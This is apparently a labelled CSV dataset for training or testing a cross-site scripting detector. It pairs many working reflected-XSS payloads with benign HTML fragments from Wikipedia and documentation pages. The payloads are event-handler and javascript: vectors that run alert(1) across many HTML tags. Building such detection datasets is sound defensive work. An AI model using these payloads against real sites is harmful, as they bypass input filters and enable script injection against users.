Sentence,Final_Label
<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,Reflected XSS
<rb onpointerenter=alert(1)>XSS</rb>,Reflected XSS
"<style>@keyframes slidein {}</style><wbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></wbr>",Reflected XSS
"<cite draggable=""true"" ondragleave=""alert(1)"">test</cite>",Reflected XSS
"<noframes onbeforecopy=""alert(1)"" contenteditable>test</noframes>",Reflected XSS
"<body onmouseup=""alert(1)"">test</body>",Reflected XSS
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;298–305 </li>",Normal
"<map onmousemove=""alert(1)"">test</map>",Reflected XSS
"<li><a href=""/wiki/Deep_learning"" title=""Deep learning"">Deep learning </a> </li>",Normal
"<ul><li><a href=""/wiki/Knowledge_representation_and_reasoning"" title=""Knowledge representation and reasoning"">Knowledge reasoning </a> </li>",Normal
<dfn onpointerdown=alert(1)>XSS</dfn>,Reflected XSS
<noscript id=x tabindex=1 onbeforeactivate=alert(1)></noscript>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>",Reflected XSS
"<header onbeforecopy=""alert(1)"" contenteditable>test</header>",Reflected XSS
"<time onkeyup=""alert(1)"" contenteditable>test</time>",Reflected XSS
"	 </span> <span class=""reference-text""><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, p.&#160;204 ",Normal
<rtc onpointerover=alert(1)>XSS</rtc>,Reflected XSS
"<hgroup oncontextmenu=""alert(1)"">test</hgroup>",Reflected XSS
"<col oncontextmenu=""alert(1)"">test</col>",Reflected XSS
<listing onpointerleave=alert(1)>XSS</listing>,Reflected XSS
"<style>:target {color:red;}</style><main id=x style=""transition:color 1s"" ontransitionend=alert(1)></main>",Reflected XSS
<pre onpointerout=alert(1)>XSS</pre>,Reflected XSS
"<frameset onmousedown=""alert(1)"">test</frameset>",Reflected XSS
"		<a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Special:Log&amp;type=review&amp;page=Artificial_intelligence"">reviewed </a> on <i>16 March 2020 </i>. </div>",Normal
"<style>@keyframes slidein {}</style><time style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></time>",Reflected XSS
"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_2,_Chapter_4,_Chapter_6-71""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_2,_Chapter_4,_Chapter_6_71-0"">^ </a> </b> ",Normal
<figcaption onpointerout=alert(1)>XSS</figcaption>,Reflected XSS
<datalist onpointermove=alert(1)>XSS</datalist>,Reflected XSS
"<ul oncopy=""alert(1)"" contenteditable>test</ul>",Reflected XSS
"<style>@keyframes slidein {}</style><base style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></base>",Reflected XSS
"<basefont onclick=""alert(1)"">test</basefont>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></datalist>",Reflected XSS
"<li><a href=""/wiki/Hypothetico-deductive_model"" title=""Hypothetico-deductive model"">Hypothetico-deductive model </a> </li>",Normal
"<big onmousemove=""alert(1)"">test</big>",Reflected XSS
"<multicol draggable=""true"" ondragend=""alert(1)"">test</multicol>",Reflected XSS
"<xmp onclick=""alert(1)"">test</xmp>",Reflected XSS
"<ul><li><a href=""#CITEREFHowe1994"">Howe 1994 </a> </li> </ul>",Normal
<shadow id=x tabindex=1 onactivate=alert(1)></shadow>,Reflected XSS
<img onpointerenter=alert(1)>XSS</img>,Reflected XSS
"<h1 onkeypress=""alert(1)"" contenteditable>test</h1>",Reflected XSS
<bdi onpointerup=alert(1)>XSS</bdi>,Reflected XSS
"<li><a href=""/wiki/Machine_ethics"" title=""Machine ethics"">Machine ethics </a> </li>",Normal
<image2 onpointerup=alert(1)>XSS</image2>,Reflected XSS
<progress onpointerenter=alert(1)>XSS</progress>,Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></footer>",Reflected XSS
"<base onkeyup=""alert(1)"" contenteditable>test</base>",Reflected XSS
"<listing draggable=""true"" ondragenter=""alert(1)"">test</listing>",Reflected XSS
<head id=x tabindex=1 onactivate=alert(1)></head>,Reflected XSS
"<ins onmousedown=""alert(1)"">test</ins>",Reflected XSS
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>",Normal
"<noscript onmouseout=""alert(1)"">test</noscript>",Reflected XSS
"<select onmouseleave=""alert(1)"">test</select>",Reflected XSS
"<i onmouseenter=""alert(1)"">test</i>",Reflected XSS
"<style>:target {color:red;}</style><multicol id=x style=""transition:color 1s"" ontransitionend=alert(1)></multicol>",Reflected XSS
<table onpointerenter=alert(1)>XSS</table>,Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></body>",Reflected XSS
"<table onmouseup=""alert(1)"">test</table>",Reflected XSS
"<hr onkeypress=""alert(1)"" contenteditable>test</hr>",Reflected XSS
"<multicol oncontextmenu=""alert(1)"">test</multicol>",Reflected XSS
"<li onmouseover=""alert(1)"">test</li>",Reflected XSS
<table onpointerleave=alert(1)>XSS</table>,Reflected XSS
"<li id=""cite_note-Ontology-98""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Ontology_98-0"">^ </a> </b> ",Normal
"<div draggable=""true"" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>",Reflected XSS
"<a href=""/wiki/History_of_artificial_intelligence"" title=""History of artificial intelligence"">History </a> </th> </tr><tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",Normal
"<li id=""cite_note-101""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-101"">^ </a> </b> ",Normal
<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>,Reflected XSS
"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></html>",Reflected XSS
<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>,Reflected XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=20"" title=""Edit section: Knowledge-based"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<div class=""section"" id=""getting-help"">",Normal
"<li class=""toclevel-2 tocsection-74""><a href=""#History_of_AI""><span class=""tocnumber"">13.2 ",Normal
"<param onbeforecut=""alert(1)"" contenteditable>test</param>",Reflected XSS
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;341–344, </li>",Normal
"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",Reflected XSS
<noscript id=x tabindex=1 onfocus=alert(1)></noscript>,Reflected XSS
<image onpointerdown=alert(1)>XSS</image>,Reflected XSS
"<picture onmouseover=""alert(1)"">test</picture>",Reflected XSS
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationstart=""alert(1)""></dialog>",Reflected XSS
"<dl ondblclick=""alert(1)"">test</dl>",Reflected XSS
<button onfocusout=alert(1) id=x></button><input autofocus>,Reflected XSS
<map onpointermove=alert(1)>XSS</map>,Reflected XSS
"      <span class=""fa fa-book""> Read the Docs",Normal
"<track draggable=""true"" ondragend=""alert(1)"">test</track>",Reflected XSS
"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Artificial_intelligence_arms_race"" title=""Artificial intelligence arms race"">Artificial intelligence arms race </a>, <a href=""/wiki/Lethal_autonomous_weapon"" title=""Lethal autonomous weapon"">Lethal autonomous weapon </a>, and <a href=""/wiki/Unmanned_combat_aerial_vehicle"" title=""Unmanned combat aerial vehicle"">Unmanned combat aerial vehicle </a> </div>",Normal
"<select onmouseup=""alert(1)"">test</select>",Reflected XSS
"	 </span> <span class=""reference-text"">Alex Graves, Santiago Fernandez, Faustino Gomez, and <a href=""/wiki/J%C3%BCrgen_Schmidhuber"" title=""Jürgen Schmidhuber"">Jürgen Schmidhuber </a> (2006). Connectionist temporal classification: Labelling unsegmented sequence data with recurrent neural nets. Proceedings of ICML'06, pp. 369–376. ",Normal
"<shadow draggable=""true"" ondragstart=""alert(1)"">test</shadow>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ins>",Reflected XSS
<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>,Reflected XSS
"<blockquote oncut=""alert(1)"" contenteditable>test</blockquote>",Reflected XSS
"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdi>",Reflected XSS
"<br onkeydown=""alert(1)"" contenteditable>test</br>",Reflected XSS
"<a href=""/wiki/Ontology_(computer_science)"" class=""mw-redirect"" title=""Ontology (computer science)"">Ontology </a>:",Normal
"<center onmouseup=""alert(1)"">test</center>",Reflected XSS
"<picture draggable=""true"" ondrag=""alert(1)"">test</picture>",Reflected XSS
"<legend onkeyup=""alert(1)"" contenteditable>test</legend>",Reflected XSS
"<a href=""/wiki/Computational_intelligence"" title=""Computational intelligence"">Computational intelligence </a>",Normal
"<li id=""cite_note-Golden_years_of_AI-37""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Golden_years_of_AI_37-0"">^ </a> </b> ",Normal
<strong onpointerdown=alert(1)>XSS</strong>,Reflected XSS
"        <script src=""https://assets.readthedocs.org/static/javascript/readthedocs-doc-embed.js""></script>",Normal
"<form onkeypress=""alert(1)"" contenteditable>test</form>",Reflected XSS
<figure onpointerover=alert(1)>XSS</figure>,Reflected XSS
"<font oncontextmenu=""alert(1)"">test</font>",Reflected XSS
"<del draggable=""true"" ondragenter=""alert(1)"">test</del>",Reflected XSS
"<p onkeyup=""alert(1)"" contenteditable>test</p>",Reflected XSS
"<FRAME SRC=""javascript:alert('')",Reflected XSS
"<ul><li><a href=""/wiki/Subjectivity"" title=""Subjectivity"">Polycontexturality </a> </li>",Normal
"<fieldset onmouseup=""alert(1)"">test</fieldset>",Reflected XSS
"<frame draggable=""true"" ondragleave=""alert(1)"">test</frame>",Reflected XSS
"<meta onmouseup=""alert(1)"">test</meta>",Reflected XSS
"<li onbeforepaste=""alert(1)"" contenteditable>test</li>",Reflected XSS
<multicol onpointerenter=alert(1)>XSS</multicol>,Reflected XSS
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2FAVSS.2017.8078512"">10.1109/AVSS.2017.8078512 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-1-5386-2939-0"" title=""Special:BookSources/978-1-5386-2939-0""><bdi>978-1-5386-2939-0 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Combining+LiDAR+space+clustering+and+convolutional+neural+networks+for+pedestrian+detection&amp;rft.pages=1-6&amp;rft.date=2017&amp;rft_id=info%3Aarxiv%2F1710.06160&amp;rft_id=info%3Adoi%2F10.1109%2FAVSS.2017.8078512&amp;rft.isbn=978-1-5386-2939-0&amp;rft.aulast=Matti&amp;rft.aufirst=D.&amp;rft.au=Ekenel%2C+H.+K.&amp;rft.au=Thiran%2C+J.+P.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<nobr onkeypress=""alert(1)"" contenteditable>test</nobr>",Reflected XSS
"<menuitem onpaste=""alert(1)"" contenteditable>test</menuitem>",Reflected XSS
"<li id=""cite_note-36""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-36"">^ </a> </b> ",Normal
"<isindex onbeforecut=""alert(1)"" contenteditable>test</isindex>",Reflected XSS
<dt onpointerleave=alert(1)>XSS</dt>,Reflected XSS
<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>,Reflected XSS
<aside onpointerout=alert(1)>XSS</aside>,Reflected XSS
"<mark onbeforecopy=""alert(1)"" contenteditable>test</mark>",Reflected XSS
"<summary oncopy=""alert(1)"" contenteditable>test</summary>",Reflected XSS
"<template onmousedown=""alert(1)"">test</template>",Reflected XSS
"<optgroup onkeydown=""alert(1)"" contenteditable>test</optgroup>",Reflected XSS
<tbody onblur=alert(1) tabindex=1 id=x></tbody><input autofocus>,Reflected XSS
"<i onkeyup=""alert(1)"" contenteditable>test</i>",Reflected XSS
"<input onmousemove=""alert(1)"">test</input>",Reflected XSS
<footer id=x tabindex=1 onfocus=alert(1)></footer>,Reflected XSS
<picture onpointerout=alert(1)>XSS</picture>,Reflected XSS
"<style>@keyframes slidein {}</style><data style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></data>",Reflected XSS
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;35–77, </li>",Normal
<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>,Reflected XSS
"      <span class=""fa fa-caret-down"">",Normal
"<li><a href=""/wiki/Concept"" title=""Concept"">Concept </a> </li>",Normal
"<li class=""toclevel-1 tocsection-76""><a href=""#Further_reading""><span class=""tocnumber"">14 ",Normal
"<li id=""cite_note-301""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-301"">^ </a> </b> ",Normal
"<figure ondblclick=""alert(1)"">test</figure>",Reflected XSS
"<div role=""navigation"" class=""navbox authority-control"" aria-labelledby=""Authority_control_frameless_&amp;#124;text-top_&amp;#124;10px_&amp;#124;alt=Edit_this_at_Wikidata_&amp;#124;link=https&amp;#58;//www.wikidata.org/wiki/Q11660&amp;#124;Edit_this_at_Wikidata"" style=""padding:3px""><table class=""nowraplinks hlist navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th id=""Authority_control_frameless_&amp;#124;text-top_&amp;#124;10px_&amp;#124;alt=Edit_this_at_Wikidata_&amp;#124;link=https&amp;#58;//www.wikidata.org/wiki/Q11660&amp;#124;Edit_this_at_Wikidata"" scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Help:Authority_control"" title=""Help:Authority control"">Authority control </a> <a href=""https://www.wikidata.org/wiki/Q11660"" title=""Edit this at Wikidata""><img alt=""Edit this at Wikidata"" src=""//upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/10px-OOjs_UI_icon_edit-ltr-progressive.svg.png"" decoding=""async"" width=""10"" height=""10"" style=""vertical-align: text-top"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/15px-OOjs_UI_icon_edit-ltr-progressive.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/8/8a/OOjs_UI_icon_edit-ltr-progressive.svg/20px-OOjs_UI_icon_edit-ltr-progressive.svg.png 2x"" data-file-width=""20"" data-file-height=""20"" /> </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
"<noembed oncut=""alert(1)"" contenteditable>test</noembed>",Reflected XSS
"<b draggable=""true"" ondragleave=""alert(1)"">test</b>",Reflected XSS
<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>,Reflected XSS
"<ins ondblclick=""alert(1)"">test</ins>",Reflected XSS
"<dt><a class=""reference internal"" href=""topics/jobs.html""><span class=""doc"">Jobs: pausing and resuming crawls",Normal
"<image onkeyup=""alert(1)"" contenteditable>test</image>",Reflected XSS
"<rt onmouseleave=""alert(1)"">test</rt>",Reflected XSS
"<label onmouseover=""alert(1)"">test</label>",Reflected XSS
"<image oncut=""alert(1)"" contenteditable>test</image>",Reflected XSS
"<element onmousedown=""alert(1)"">test</element>",Reflected XSS
"<dir onmouseup=""alert(1)"">test</dir>",Reflected XSS
<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>,Reflected XSS
<style onpointerenter=alert(1)>XSS</style>,Reflected XSS
<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>",Reflected XSS
"<dt onmouseover=""alert(1)"">test</dt>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>",Reflected XSS
"<u onmousemove=""alert(1)"">test</u>",Reflected XSS
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></h1>",Reflected XSS
"<li><a href=""/wiki/Knowledge_representation_and_reasoning"" title=""Knowledge representation and reasoning"">Knowledge representation </a> </li>",Normal
"<source onmouseover=""alert(1)"">test</source>",Reflected XSS
"<slot onkeypress=""alert(1)"" contenteditable>test</slot>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",Reflected XSS
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationstart=""alert(1)""></strong>",Reflected XSS
<tt id=x tabindex=1 onfocus=alert(1)></tt>,Reflected XSS
<image id=x tabindex=1 onbeforeactivate=alert(1)></image>,Reflected XSS
<img src=validimage.png onloadend=alert(1)>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>",Reflected XSS
"<code onbeforecopy=""alert(1)"" contenteditable>test</code>",Reflected XSS
"<select oncopy=""alert(1)"" contenteditable>test</select>",Reflected XSS
<bgsound onpointerup=alert(1)>XSS</bgsound>,Reflected XSS
"<param onmouseenter=""alert(1)"">test</param>",Reflected XSS
<col onpointerup=alert(1)>XSS</col>,Reflected XSS
<isindex onpointerdown=alert(1)>XSS</isindex>,Reflected XSS
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;790–831 </li>",Normal
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rtc id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rtc>",Reflected XSS
"<li><a href=""/wiki/G%C3%B6del%27s_incompleteness_theorems"" title=""Gödel&#39;s incompleteness theorems"">Incompleteness theorem </a><span class=""nowrap"">&#160; ",Normal
"<ol onmousemove=""alert(1)"">test</ol>",Reflected XSS
"<s draggable=""true"" ondrag=""alert(1)"">test</s>",Reflected XSS
"<style onkeypress=""alert(1)"" contenteditable>test</style>",Reflected XSS
"<style>:target {color: red;}</style><optgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></optgroup>",Reflected XSS
<sub onpointerup=alert(1)>XSS</sub>,Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.moma.org/calendar/exhibitions/3863"">""Thinking Machines: Art and Design in the Computer Age, 1959–1989"" </a>. <i>The Museum of Modern Art </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 July ",Normal
<div onfocusout=alert(1) tabindex=1 id=x></div><input autofocus>,Reflected XSS
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>",Reflected XSS
<dl onpointerdown=alert(1)>XSS</dl>,Reflected XSS
"<fieldset onmousemove=""alert(1)"">test</fieldset>",Reflected XSS
"<source draggable=""true"" ondragend=""alert(1)"">test</source>",Reflected XSS
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",Reflected XSS
"<style>:target {color:red;}</style><bdo id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdo>",Reflected XSS
"<slot onclick=""alert(1)"">test</slot>",Reflected XSS
"<strike onbeforepaste=""alert(1)"" contenteditable>test</strike>",Reflected XSS
<plaintext onpointerup=alert(1)>XSS</plaintext>,Reflected XSS
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>,Reflected XSS
"<param draggable=""true"" ondragend=""alert(1)"">test</param>",Reflected XSS
	 </span></a></dt><dd>Define the data you want to scrape.</dd>,Normal
"<li id=""cite_note-377""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-377"">^ </a> </b> ",Normal
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></video>",Reflected XSS
<plaintext onpointermove=alert(1)>XSS</plaintext>,Reflected XSS
<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>,Reflected XSS
"<style>@keyframes slidein {}</style><tt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tt>",Reflected XSS
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,Reflected XSS
"<h3><span class=""mw-headline"" id=""Video_games"">Video games ",Normal
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionend=alert(1)></area>",Reflected XSS
<b onpointermove=alert(1)>XSS</b>,Reflected XSS
"<details onclick=""alert(1)"">test</details>",Reflected XSS
"<li><a class=""mw-selflink selflink"">Artificial intelligence </a>",Normal
"<li class=""toclevel-3 tocsection-51""><a href=""#Existential_risk""><span class=""tocnumber"">8.2.1 ",Normal
"<li id=""cite_note-Second_AI_winter-12""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Second_AI_winter_12-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Second_AI_winter_12-1""><sup><i><b>b </b> </i> </sup> </a> ",Normal
"<spacer onmouseup=""alert(1)"">test</spacer>",Reflected XSS
"<form oncut=""alert(1)"" contenteditable>test</form>",Reflected XSS
"<audio onmousemove=""alert(1)"">test</audio>",Reflected XSS
"<li><a href=""/wiki/William_Whewell"" title=""William Whewell"">William Whewell </a> </li>",Normal
"<nav onkeydown=""alert(1)"" contenteditable>test</nav>",Reflected XSS
<button id=x tabindex=1 onactivate=alert(1)></button>,Reflected XSS
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",Reflected XSS
<dfn onpointerenter=alert(1)>XSS</dfn>,Reflected XSS
"<output draggable=""true"" ondragend=""alert(1)"">test</output>",Reflected XSS
"<del onmouseenter=""alert(1)"">test</del>",Reflected XSS
<keygen onpointerdown=alert(1)>XSS</keygen>,Reflected XSS
"<optgroup draggable=""true"" ondragenter=""alert(1)"">test</optgroup>",Reflected XSS
"<template onbeforepaste=""alert(1)"" contenteditable>test</template>",Reflected XSS
"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>",Reflected XSS
<noscript onfocusout=alert(1) tabindex=1 id=x></noscript><input autofocus>,Reflected XSS
<base onpointerdown=alert(1)>XSS</base>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",Reflected XSS
"<table onkeyup=""alert(1)"" contenteditable>test</table>",Reflected XSS
"<li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;129–130 </li> </ul>",Normal
"	 <div style=""padding:0em 0.25em""> </div><table class=""nowraplinks mw-collapsible mw-collapsed navbox-subgroup"" style=""border-spacing:0""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",Normal
<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>,Reflected XSS
"<template draggable=""true"" ondragleave=""alert(1)"">test</template>",Reflected XSS
<tbody id=x tabindex=1 onbeforedeactivate=alert(1)></tbody><input autofocus>,Reflected XSS
"<hgroup onpaste=""alert(1)"" contenteditable>test</hgroup>",Reflected XSS
<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>,Reflected XSS
<time id=x tabindex=1 onfocusin=alert(1)></time>,Reflected XSS
<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>,Reflected XSS
"<tt onpaste=""alert(1)"" contenteditable>test</tt>",Reflected XSS
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",Reflected XSS
"<marquee oncut=""alert(1)"" contenteditable>test</marquee>",Reflected XSS
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationstart=""alert(1)""></spacer>",Reflected XSS
<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>,Reflected XSS
<picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>,Reflected XSS
"<picture><source srcset=""validimage.png""><img onloadend=alert(1)></picture>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>",Reflected XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=NextBigWhat&amp;rft.atitle=AI+traffic+signals+to+be+installed+in+Bengaluru+soon&amp;rft.date=2019-09-24&amp;rft_id=https%3A%2F%2Fnextbigwhat.com%2Fai-traffic-signals-to-be-installed-in-bengaluru-soon%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"	<div class=""mw-indicators mw-body-content"">",Normal
"<big oncontextmenu=""alert(1)"">test</big>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",Reflected XSS
"	 </span> [<a rel=""nofollow"" class=""external text"" href=""//arxiv.org/archive/cs.CL"">cs.CL </a>]. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=preprint&amp;rft.jtitle=arXiv&amp;rft.atitle=Sequence+to+Sequence+Learning+with+Neural+Networks&amp;rft.date=2014&amp;rft_id=info%3Aarxiv%2F1409.3215&amp;rft.aulast=Sutskever&amp;rft.aufirst=Ilya&amp;rft.au=Vinyals%2C+Oriol&amp;rft.au=Le%2C+Quoc+V.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<select onbeforepaste=""alert(1)"" contenteditable>test</select>",Reflected XSS
"<li id=""cite_note-Singularity-410""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Singularity_410-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Singularity_410-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-Singularity_410-2""><sup><i><b>c </b> </i> </sup> </a> ",Normal
"<p draggable=""true"" ondragenter=""alert(1)"">test</p>",Reflected XSS
"<big onmouseenter=""alert(1)"">test</big>",Reflected XSS
"<tr onmousedown=""alert(1)"">test</tr>",Reflected XSS
